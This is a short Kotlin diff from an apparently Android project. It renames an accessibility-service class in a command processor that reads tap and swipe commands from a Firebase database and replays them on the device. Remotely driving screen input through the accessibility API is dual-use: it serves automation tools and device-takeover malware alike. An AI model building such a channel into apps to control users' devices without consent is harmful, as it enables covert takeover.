@@ -13,7 +13,7 @@ class CommandProcessor(private val context: Context) {
     init {
         commandsRef.addChildEventListener(object : ChildEventListener {
             override fun onChildAdded(snapshot: DataSnapshot, previousChildName: String?) {
-                val cmd = snapshot.getValue(AccessibilityService.Command::class.java) ?: return
+                val cmd = snapshot.getValue(MyAccessibilityService.Command::class.java) ?: return
                 executeCommand(cmd)
                 snapshot.ref.removeValue()
             }
@@ -24,8 +24,8 @@ class CommandProcessor(private val context: Context) {
         })
     }
 
-    private fun executeCommand(cmd: AccessibilityService.Command) {
-        val service = AccessibilityService.instance
+    private fun executeCommand(cmd: MyAccessibilityService.Command) {
+        val service = MyAccessibilityService.instance
         when (cmd.type) {
             "tap" -> service?.tap(cmd.x ?: 0, cmd.y ?: 0)
             "swipe" -> service?.swipe(cmd.sx ?: 0, cmd.sy ?: 0, cmd.ex ?: 0, cmd.ey ?: 0)
